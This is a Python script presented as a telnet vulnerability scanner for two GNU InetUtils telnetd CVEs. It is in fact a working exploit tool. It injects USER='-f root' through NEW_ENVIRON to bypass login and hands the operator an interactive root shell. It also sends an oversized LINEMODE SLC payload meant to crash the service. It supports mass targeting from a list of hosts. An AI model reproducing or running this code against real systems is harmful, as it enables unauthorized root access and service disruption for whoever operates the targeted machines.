#!/usr/bin/env python3
"""
Interactive Telnet Vulnerability Scanner for:
    CVE-2026-32746 – Buffer overflow in LINEMODE SLC suboption (GNU InetUtils telnetd)
    CVE-2026-24061  – Authentication bypass via USER environment variable injection

If the bypass succeeds, you get an interactive root shell DIRECTLY in the same terminal.

"""

import socket
import sys
import time
import argparse
import select
import termios
import tty
import signal
import os
from contextlib import contextmanager

# Telnet protocol constants
IAC = b'\xff'
DO  = b'\xfd'
DONT = b'\xfe'
WILL = b'\xfb'
WONT = b'\xfc'
SB  = b'\xfa'
SE  = b'\xf0'

# Option numbers
TELOPT_LINEMODE = 34
TELOPT_NEW_ENVIRON = 39

def send_iac(sock, command, option):
    """Send a single IAC command (e.g., IAC DO LINEMODE)."""
    try:
        sock.send(IAC + command + bytes([option]))
    except (socket.error, BrokenPipeError):
        pass

def send_subnegotiation(sock, option, data):
    """Send a full subnegotiation: IAC SB option data IAC SE."""
    try:
        sock.send(IAC + SB + bytes([option]) + data + IAC + SE)
    except (socket.error, BrokenPipeError):
        pass

def recv_until_timeout(sock, timeout=2):
    """Read available data until timeout, return bytes."""
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    except (socket.error, BrokenPipeError):
        pass
    except Exception:
        pass
    sock.settimeout(None)
    return data

def check_service_available(host, port, timeout=5):
    """Check if the telnet service is actually reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

@contextmanager
def raw_mode(file):
    """Context manager to put terminal into raw mode and restore on exit."""
    old_attrs = termios.tcgetattr(file.fileno())
    tty.setraw(file.fileno())
    try:
        yield
    finally:
        termios.tcsetattr(file.fileno(), termios.TCSADRAIN, old_attrs)

def interactive_shell(sock):
    """
    Provide an interactive shell over the given socket.
    The shell appears DIRECTLY in this terminal window - no separate terminal needed.
    Type commands, press Enter, and see output immediately like a normal shell.
    Press Ctrl+C to exit the shell and return to the scanner menu.
    """
    print("\n" + "="*60)
    print("[+] ROOT SHELL OBTAINED! You are now in an interactive root shell.")
    print("[+] Type commands directly here. Press Ctrl+C to exit shell.")
    print("="*60 + "\n")
    
    try:
        with raw_mode(sys.stdin):
            while True:
                rlist, _, _ = select.select([sock, sys.stdin], [], [])
                for fd in rlist:
                    if fd is sock:
                        data = sock.recv(4096)
                        if not data:
                            print("\n[!] Connection closed by remote host.")
                            return
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                    elif fd is sys.stdin:
                        ch = sys.stdin.buffer.read(1)
                        if not ch:
                            return
                        sock.send(ch)
    except KeyboardInterrupt:
        print("\n\n[*] Exiting shell, returning to menu...")
    except Exception as e:
        print(f"\n[!] Error in interactive shell: {e}")

def test_cve_2026_24061(host, port):
    """
    CVE-2026-24061: argument injection via USER environment variable.
    Sends USER="-f root" using NEW_ENVIRON subnegotiation.
    If a shell is obtained, return the socket for interactive use.
    Otherwise, return None.
    """
    print("[*] Testing CVE-2026-24061 (authentication bypass)...")
    sock = None
    try:
        if not check_service_available(host, port, timeout=3):
            print(f"[-] Service not reachable on {host}:{port}")
            return None
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        send_iac(sock, DO, TELOPT_NEW_ENVIRON)
        send_iac(sock, WILL, TELOPT_NEW_ENVIRON)
        recv_until_timeout(sock, 1)

        subdata = b'\x00'
        subdata += b'\x00' + b'USER'
        subdata += b'\x01' + b'-f root'
        send_subnegotiation(sock, TELOPT_NEW_ENVIRON, subdata)

        time.sleep(1)
        banner = recv_until_timeout(sock, 2)

        if any(prompt in banner for prompt in [b'# ', b'$ ', b'> ', b'root@']):
            print("[!] CVE-2026-24061: VULNERABLE – shell obtained!")
            sock.settimeout(None)
            return sock
        else:
            if b'login:' in banner.lower():
                print("[+] Authentication bypass might have failed; server presented login prompt.")
            elif banner:
                print(f"[+] Received response: {banner[:100]}...")
            else:
                print("[+] No response received; may still be vulnerable (requires further analysis).")
            sock.close()
            return None
    except socket.timeout:
        print("[-] Connection timeout - target may be unreachable or firewalled")
        if sock:
            sock.close()
        return None
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running on port")
        if sock:
            sock.close()
        return None
    except Exception as e:
        print(f"[-] Error during CVE-2026-24061 test: {e}")
        if sock:
            sock.close()
        return None

def test_cve_2026_32746(host, port):
    """
    CVE-2026-32746: buffer overflow in LINEMODE SLC suboption.
    Sends a large number of SLC triplets to overflow the fixed-size buffer.
    If the server crashes (connection reset), it is likely vulnerable.
    """
    print("[*] Testing CVE-2026-32746 (buffer overflow)...")
    sock = None
    try:
        if not check_service_available(host, port, timeout=3):
            print(f"[-] Service not reachable on {host}:{port}")
            return False
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        send_iac(sock, DO, TELOPT_LINEMODE)
        send_iac(sock, WILL, TELOPT_LINEMODE)
        recv_until_timeout(sock, 1)

        triplet = b'\x01\x01\x00'
        overflow_data = triplet * 500
        subdata = b'\x00' + overflow_data
        send_subnegotiation(sock, TELOPT_LINEMODE, subdata)

        time.sleep(1)
        sock.send(b'\r\n')
        response = recv_until_timeout(sock, 2)
        if response:
            print("[+] Server did not crash; likely not vulnerable to CVE-2026-32746")
            return False
        else:
            print("[!] CVE-2026-32746: VULNERABLE (connection dropped)")
            return True
    except socket.timeout:
        print("[-] Connection timeout during test - target may be unreachable")
        return False
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running")
        return False
    except (socket.error, BrokenPipeError, ConnectionResetError) as e:
        if isinstance(e, (ConnectionResetError, BrokenPipeError)) or "reset" in str(e).lower():
            print(f"[!] CVE-2026-32746: VULNERABLE (server crashed: {e})")
            return True
        else:
            print(f"[-] Connection error: {e}")
            return False
    except Exception as e:
        print(f"[-] Error during CVE-2026-32746 test: {e}")
        return False
    finally:
        try:
            if sock:
                sock.close()
        except:
            pass

def scan_from_file(filename, port, test_choice):
    """Read IPs from file and scan each one"""
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not targets:
            print("[-] No targets found in file")
            return
        
        print(f"\n[*] Loaded {len(targets)} targets from {filename}\n")
        
        results = []
        for i, target in enumerate(targets, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{len(targets)}] Scanning {target}:{port}")
            print('='*50)
            
            try:
                host = socket.gethostbyname(target)
                print(f"[*] Resolved {target} -> {host}")
            except socket.gaierror:
                print(f"[-] Cannot resolve {target}")
                results.append({'target': target, 'status': 'DNS resolution failed'})
                continue
            
            if not check_service_available(host, port, timeout=3):
                print(f"[-] Service not reachable on {host}:{port}")
                results.append({'target': target, 'status': 'Service unreachable'})
                continue
            
            print("[+] Service reachable")
            
            if test_choice == "2" or test_choice == "1":
                print("\n[*] Testing CVE-2026-24061...")
                shell_sock = test_cve_2026_24061(host, port)
                if shell_sock:
                    print(f"[!] {target}: VULNERABLE to CVE-2026-24061")
                    results.append({'target': target, 'status': 'VULNERABLE to CVE-2026-24061'})
                    # Option to interact with shell
                    print("\n[?] Shell obtained! Interact now? (y/N): ", end='')
                    choice = input().strip().lower()
                    if choice == 'y':
                        interactive_shell(shell_sock)
                    try:
                        shell_sock.close()
                    except:
                        pass
                else:
                    results.append({'target': target, 'status': 'Not vulnerable to CVE-2026-24061'})
            
            if test_choice == "3" or test_choice == "1":
                print("\n[*] Testing CVE-2026-32746...")
                vuln = test_cve_2026_32746(host, port)
                if vuln:
                    results.append({'target': target, 'status': 'VULNERABLE to CVE-2026-32746'})
                else:
                    if test_choice == "1":
                        # Don't overwrite if already have a status
                        pass
                    else:
                        results.append({'target': target, 'status': 'Not vulnerable to CVE-2026-32746'})
            
            print()
        
        # Print summary
        print("\n" + "="*60)
        print("SCAN SUMMARY")
        print("="*60)
        for result in results:
            print(f"{result['target']}: {result['status']}")
        print("="*60)
        
    except FileNotFoundError:
        print(f"[-] File not found: {filename}")
    except Exception as e:
        print(f"[-] Error reading file: {e}")

def interactive_menu():
    print("=== Telnet Vulnerability Scanner ===")
    print("1. Scan a single target")
    print("2. Scan targets from file (one IP/hostname per line)")
    print("3. Exit")
    choice = input("\nChoose option: ").strip()
    
    if choice == "3":
        sys.exit(0)
    
    port = input("Port (default 23): ").strip()
    if not port:
        port = 23
    else:
        try:
            port = int(port)
        except ValueError:
            print("Invalid port, using 23.")
            port = 23
    
    # Test selection
    print("\nWhich tests to run?")
    print("1. Both")
    print("2. Only CVE-2026-24061 (auth bypass - gives shell if vulnerable)")
    print("3. Only CVE-2026-32746 (buffer overflow detection)")
    test_choice = input("Choice [1-3]: ").strip()
    
    if choice == "1":
        # Single target
        target = input("Target (IP or domain): ").strip()
        
        try:
            host = socket.gethostbyname(target)
            print(f"[*] Resolved {target} -> {host}")
        except socket.gaierror:
            print(f"[-] Cannot resolve {target}")
            return
        
        print(f"\n[*] Scanning {host}:{port}...\n")
        
        if not check_service_available(host, port, timeout=5):
            print(f"[-] No service detected on {host}:{port}")
            print("    - Service not running or firewall blocking")
            input("\nPress Enter to continue...")
            return
        
        print("[+] Service reachable\n")
        
        if test_choice == "2":
            shell_sock = test_cve_2026_24061(host, port)
            if shell_sock:
                interactive_shell(shell_sock)
                try:
                    shell_sock.close()
                except:
                    pass
        elif test_choice == "3":
            test_cve_2026_32746(host, port)
        else:
            shell_sock = test_cve_2026_24061(host, port)
            if shell_sock:
                interactive_shell(shell_sock)
                try:
                    shell_sock.close()
                except:
                    pass
            print("\n" + "="*50)
            test_cve_2026_32746(host, port)
        
        input("\nPress Enter to continue...")
    
    elif choice == "2":
        # Scan from file
        filename = input("Enter filename with targets (one per line): ").strip()
        scan_from_file(filename, port, test_choice)
        input("\nPress Enter to continue...")
    
    else:
        print("Invalid choice.")

def main():
    def signal_handler(sig, frame):
        print("\n[!] Exiting.")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    
    if sys.platform == 'win32':
        print("[-] Warning: This script is designed for Unix-like systems (Linux/macOS)")
        print("    The interactive shell may not work properly on Windows.")
        response = input("Continue anyway? (y/N): ").strip().lower()
        if response != 'y':
            sys.exit(0)
    
    while True:
        try:
            interactive_menu()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            sys.exit(0)
        except Exception as e:
            print(f"\n[-] Unexpected error: {e}")
            response = input("Continue? (y/N): ").strip().lower()
            if response != 'y':
                sys.exit(0)

if __name__ == "__main__":
    main()
